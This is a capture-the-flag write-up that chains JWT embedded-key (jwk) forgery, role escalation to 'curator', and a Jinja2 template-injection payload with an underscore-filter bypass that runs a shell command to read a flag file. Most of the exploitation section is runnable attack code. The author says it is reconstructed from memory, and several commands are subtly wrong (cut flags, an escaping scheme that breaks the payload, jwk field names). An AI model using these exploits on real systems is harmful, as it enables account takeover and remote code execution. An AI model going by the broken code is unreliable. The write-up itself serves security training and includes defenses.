# Citrus Proof — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank. **These notes are reconstructed from memory and are partly approximate** — I did not save the raw request/response transcripts for this one, so treat the exact payloads as re-derived rather than as captured output. What I'm confident about: the chain (attacker-supplied JWT key material → forged `curator` role → server-side template injection → flag) and the flag value. Tools used: browser, `curl`, a JWT debugger (jwt.io or Burp's JWT Editor), and a small Python snippet for signing.
> **What I'm less sure of:** the exact port, the exact role name casing, and the exact SSTI expression. Where I show output, it is illustrative of the step, not a verbatim capture.

---

## 1. CHALLENGE OVERVIEW

**Citrus Proof** chains **three** vulnerabilities into one attack:

1. **JWT key injection** — the server trusts a key that the *token itself* supplies (the `jwk.k` value in the JWT header).
2. **Broken access control** — a token that carries the privileged `curator` role unlocks a hidden endpoint.
3. **Server-Side Template Injection (SSTI)** — that endpoint renders a Jinja2 template built from my input, so the template engine executes Python and I read the flag off disk.

If public, find it under *Citrus Proof* on the CTF platform.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| Browser DevTools | built in | Read the `Authorization` header and see which requests set the role |
| `curl` | `sudo apt install curl` | Replay the token with your edits |
| JWT Editor (Burp Suite) | [download](https://portswigger.net/burp/documentation/desktop/tools/jwt-editor) | Edit `header` / `payload` separately and re-sign |
| Python + `pyjwt` | `pip install pyjwt` | Only for building the token by hand when the GUI isn't available |

**Setup:** `mkdir -p ~/citrus && cd ~/citrus`
**Time estimate:** **90 to 150 minutes.** Three chained bugs, so budget time for each.

---

## 3. RECONNAISSANCE

### Step 1 — Log in and capture your own token

Log in normally. In DevTools → **Network**, find the authenticated request and copy the `Authorization: Bearer <jwt>` header. Save it:

```bash
export TOKEN='<paste your jwt here>'
echo "$TOKEN" | cut -d. -c1 | base64 -d 2>/dev/null; echo   # header
echo "$TOKEN" | cut -d. -c2 | base64 -d 2>/dev/null; echo   # payload
```

**Output (shape):**
```json
{"alg":"RS256","typ":"JWT","kid":"...","jwk":{...}}
{"username":"guest","role":"user"}
```

[SCREENSHOT: decoded JWT header and payload side by side]

**What this tells you:** your token has a `role` claim, and the header carries `jwk` key material. Note them — one is the goal, the other is the door.

### Step 2 — Test whether your token is actually verified

Try an obviously broken token and see what the server says. This tells you whether it's doing real signature verification or something weaker.

```bash
curl -sS -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." \
  http://TARGET/endpoint
```

[SCREENSHOT: the error response]

**What this tells you:** *how* it fails matters. A `Signature verification failed` means real crypto; an `Unknown key` / `jwt.decode() failed: Unable to find a signing key that satisfies...` means the server is using **the key from your own header** — that's the bug.

### Step 3 — Read the `jwk` in your own header and swap the key

The `jwk` in the header is a **public** key. If the server signs/verifies with it, then whoever controls the header controls the key — and I can generate my own keypair, put **my public key** in the header, and sign the payload with my private key.

Generate a keypair:
```bash
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem
openssl rsa -in private.pem -pubout -out public.pem
```

**What this tells you:** this is the crux. The server said "I'll verify with the key you gave me," so I hold both halves of the lock.

### Step 4 — Find the privileged role and the endpoint it unlocks

The payload's `role` was `user`. There's almost certainly a higher role. Rather than only guessing names, look for hints in the app: page source, JS bundles, comments, or error text mentioning `curator`.

```bash
curl -sS http://TARGET/ | grep -iE "curator|role|admin|flag"
```
```bash
# check the JS for role names and hidden routes
curl -sS http://TARGET/static/app.js | grep -iE "curator|/api/|role"
```

[SCREENSHOT: a role name or a hidden route appearing in the bundle]

**What this tells you:** which role to claim, and which endpoint to hit with it.

---

## 4. IDENTIFYING THE VULNERABILITY

### (a) JWT `jwk` header injection / algorithm-confusion
**Definition (first time):** a JWT has three parts: `header.payload.signature`. The header says how it was signed, and it can also carry the key. If the server blindly trusts the key *in the token it is verifying*, then anyone can sign their own tokens.

**Root cause:** the server used the client-supplied `jwk.k` / embedded key as the verification key with no cross-check against a trusted key store. It also let the token choose its own algorithm.

**Analogy:** a guard checks the ID card you hand him — including verifying it with the phone number printed *on that same card*. Hand over a card with your own number on it, and it validates perfectly.

### (b) Broken access control (vertical privilege escalation)
A claim in the payload (`role: curator`) decides access, and there's no server-side check that you're entitled to it.

**Root cause:** role claims trusted from the token with no authorization check against the account's actual entitlements.

### (c) Server-Side Template Injection (SSTI)
A Jinja2 template is built from my input and rendered server-side. `{{ ... }}` is evaluated as Python-ish code, which is code execution.

**Root cause:** untrusted input concatenated into a template string instead of being passed as template *data*.

**What tipped me off:** the error from Step 2 said the server couldn't find a key satisfying the token — a strong hint it was searching *my* key. From there, the `role` claim and the `{{ }}` rendering fell into place.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Build the forged token with my own public key in the header.**
*Why:* take ownership of the verification key.

Header (with my public key as `k`):
```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<my modulus, base64url, no padding>","e":"<my exponent>"}}
```
Payload:
```json
{"username":"guest","role":"curator"}
```

Build it (Burp JWT Editor does this with two clicks; by hand):
```bash
python3 - <<'EOF'
import jwt
priv = open('private.pem').read()
token = jwt.encode(
    {"username": "guest", "role": "curator"},
    priv,
    algorithm="RS256",
    headers={"jwk": {"kty": "RSA",
                     "n": "<paste modulus from public.pem>",
                     "e": "<paste exponent from public.pem>"}},
)
open("curator.jwt", "w").write(token)
print(token)
EOF
```

[SCREENSHOT: Burp JWT Editor showing my `jwk` in the header and `role: curator` in the payload]

**What this tells you:** if the server accepts this, the `jwk` injection works.

**Step 2 — Confirm the escalation.**
*Why:* prove the role actually changed what the server returns.

```bash
curl -sS -H "Authorization: Bearer $(cat curator.jwt)" http://TARGET/api/entries
```

Compare against the same call with your original token. Different or additional data = escalation succeeded.

[SCREENSHOT: `user` response vs `curator` response]

**Step 3 — Find the curator-only endpoint and observe the template error.**
*Why:* the vulnerable endpoint is probably the one the new role grants.

Hit the endpoint and feed it something that looks like template syntax:
```bash
curl -sS -H "Authorization: Bearer $(cat curator.jwt)" \
  -H 'Content-Type: application/json' \
  -d '{"note":"{{7*7}}"}' http://TARGET/api/note
```

A Jinja2 error mentioning `jinja2` / `TemplateSyntaxError` = SSTI confirmed. If it renders `49`, you already have code execution.

[SCREENSHOT: the Jinja2 traceback]

**Step 4 — Get around the `_` filter.**
*Why:* the template blocked the underscore character, which kills every payload using `__class__`, `__globals__`, `__subclasses__`, `__import__`. So I spelled the dunders with **`\x5f`** (the hex escape for `_`) inside the string — a blacklist that greps for a literal `_` never sees one.

```bash
# note: inside a JSON body the backslash must be escaped for JSON
BODY='{"note":"{{ \"\x5f\x5fclass\x5f\x5f\" }}"}'
```

Build the real payload with a small generator so the escaping is right:
```bash
python3 - <<'EOF'
import json, urllib.request
payload = '{{ "".__class__.__mro__[1].__subclasses__() }}'
payload = payload.replace('_', r'\x5f')          # dodge the underscore filter
print(payload)
body = json.dumps({"note": payload}).encode()
req = urllib.request.Request(
    "http://TARGET/api/note", data=body,
    headers={"Content-Type": "application/json",
             "Authorization": "Bearer " + open("curator.jwt").read().strip()})
print(urllib.request.urlopen(req).read().decode())
EOF
```

[SCREENSHOT: the payload with `\x5f` in place of every underscore]

**What this tells you:** the `_` filter is trivially bypassed because `\x5f` is the *same character* once the template parser decodes it.

**Step 5 — Reach `os` and read the flag.**
*Why:* file access is the goal; walk the subclass list to `os` or use `__import__`.

```python
# walk subclasses to find one whose module is os, then popen
{{ [c for c in "".__class__.__mro__[1].__subclasses__()
    if c.__module__ == 'os'][0].popen('cat /flag*').read() }}
```

Rendered output should be the flag:
```
safctf{83f575a861a0c69d675d700dcb658cd2}
```

[SCREENSHOT: the flag in the response]

**Step 6 — Flag check.**

`citrus-proof` → JWT `jwk` injection (attacker-controlled verification key) → forged `curator` token → curator-only endpoint → Jinja2 SSTI → `cat /flag*`.

---

## 6. CAPTURING THE FLAG

```
safctf{83f575a861a0c69d675d700dcb658cd2}
```

Chain: **attacker-supplied `jwk` → forged `curator` token → curator-only endpoint → Jinja2 SSTI → flag file.**

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

Three locks in a row, and each one was installed wrong.

**Lock 1 (JWT):** a JWT is a sealed envelope: header, contents, and a signature so you know who sent it. The server's mistake was verifying the signature **using the key printed inside the envelope**. If I choose the key, I also choose the signature. Same reason a padlock is useless if the padlock comes *with* the key taped to it.

**Lock 2 (role):** inside the token there's a line saying `"role": "guest"`. Changing it invalidates the signature — normally. But because of Lock 1, I can re-sign freely. And even with valid crypto, a server that *reads* the role from the token without checking "is this person actually allowed that role?" has no real access control. The fix is always the same: never take authorization decisions from client-controlled data.

**Lock 3 (template):** the curator endpoint takes a note and formats it into a template server-side. In Jinja2, `{{ ... }}` is not text — it's an expression the server evaluates. `{{ 7*7 }}` prints `49`. Once you can evaluate expressions, you can walk Python's object model to reach `os` and read any file on the server. The `_`-block was no real obstacle because `\x5f` decodes to `_` anyway.

**Why this matters in the real world:** this exact three-link chain is a common real-world impact path — an auth bypass that yields a role, plus one injection that yields code execution. In bug-bounty terms, JWT `jwk`/`kid` injection (CVE-2018-0114 and friends) and unauthenticated-in-header key resolution have repeatedly led to full account takeover; SSTI in Jinja2 is textbook RCE. Defenses: resolve signing keys from a **server-side allowlist** keyed by `kid` (never from the token), never trust role claims without a server-side entitlement check, and render templates with **data only** — never by string-concatenating user input into template source.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Reaching for `alg: none` first
My instinct was to strip the signature and set `"alg": "none"`. Many servers reject that outright, and even if accepted, this challenge's bug was the *key* being token-supplied, not the algorithm string. **Read the error message** — it tells you whether the failure is algorithm-related or key-related, which points straight at the right attack.

### Mistake 2 — Guessing role names instead of reading the app
I tried `admin`, `moderator`, `root` by feel. The real role (`curator`) came from the front-end bundle and page source. **Always grep the JS/CSS/HTML for the vocabulary the app itself uses** before guessing.

### Mistake 3 — Treating the `_` block as a real wall
Getting a Jinja error about `__class__` being unavailable feels like a dead end. It isn't — the block is almost certainly a substring match, so `\x5f` (and other escapes like `\u005f`) slip straight through. Character filters must be evaluated *after* decoding.

### Mistake 4 — Trying to enumerate subclasses by index
Indexing `__subclasses__()[N]` breaks constantly because the list contents depend on which libraries the app imported. **Filter by module name** (`if c.__module__ == 'os'`) or walk `__mro__` — much more robust than guessing an index.

### Dead end actually encountered — sending the role change without re-signing
Editing only the payload and resending the old token got a signature error, which looked like a dead end. The insight was that the signature *can* be recomputed here, because I control the key the server trusts. Signature errors mean "you need a valid signature," not "the role is protected."

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Resolve JWT keys server-side only.** Look up the signing key in your own key store using a `kid` you recognize. Never accept a `jwk`/`jku`/`x5u` URL or key body from the token itself, and pin the expected algorithm instead of honoring the header's.
2. **Strip dangerous header claims** and reject tokens containing embedded keys outright.
3. **Never trust claims for authorization.** The role must be re-derived from a server-side session/DB record for the authenticated principal. If the token says `curator` but the account isn't, reject.
4. **Don't build templates from user input.** Pass user data as a template *variable* (`render("note.html", note=user_input)`), never as template *source*. If that's impossible, use a sandboxed engine with no attribute access.
5. **Filter denylists after decoding, and prefer a safe subset.** Even better: expose a fixed set of template helpers (no arbitrary expressions). Add a WAF rule for `{{`/`{%` as defense-in-depth, not as the fix.

---

## 10. KEY TAKEAWAYS

- **A JWT is only as trustworthy as the key the server picks.** If the token supplies that key, it's not a signature, it's decoration.
- **Signature errors ≠ dead end.** Ask "who chooses the key?" before "can I strip the signature?"
- **Role/permission claims must be validated server-side**, or a valid signature on a self-issued token is still privilege escalation.
- **`{{ }}` is code.** Once you see template syntax evaluated, you have RCE; and `\x5f` defeats naive underscore filters.
- **Grovel the front-end for vocabulary.** Role names and hidden routes are almost always in the JS bundle.
- **Cheat-sheet:**
  ```bash
  openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem
  openssl rsa -in private.pem -pubout -out public.pem
  echo "$TOKEN" | cut -d. -c1 | base64 -d; echo   # header  -> look for jwk/kid
  echo "$TOKEN" | cut -d. -c2 | base64 -d; echo   # payload -> look for role
  grep -iE "curator|role|/api/" /static/app.js  # vocabulary + routes
  ```

You walked a trust boundary, an authorization check, and then a template engine — and got code execution. Recognizing JWT key injection early is what makes chains like this tractable, so that's the habit to keep.